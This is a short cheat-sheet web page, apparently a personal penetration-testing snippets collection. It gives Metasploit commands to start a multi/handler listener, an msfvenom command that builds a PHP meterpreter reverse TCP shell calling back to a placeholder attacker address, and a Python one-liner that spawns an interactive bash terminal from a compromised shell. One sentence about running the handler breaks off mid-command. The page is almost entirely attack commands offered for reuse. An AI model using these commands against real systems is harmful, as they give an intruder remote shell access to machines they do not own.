---
title: /snippets
layout: page
permalink: /snippets
---

### Metasploit
#### Handlers
```bash 
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD <Payload name>
msf6 > set LHOST <LHOST value>
msf6 > set LPORT <LPORT value>
msf6 > set ExitOnSession false
msf6 > exploit -j -z
```
<br/>
Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r 
<br/>

#### Scripting Payloads
###### PHP
```bash
$ msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> lport=<your-port-address> -o shell.php
```


### Python
##### spawn a terminal 
```python
$ python -c 'import pty;pty.spawn("/bin/bash")';
```
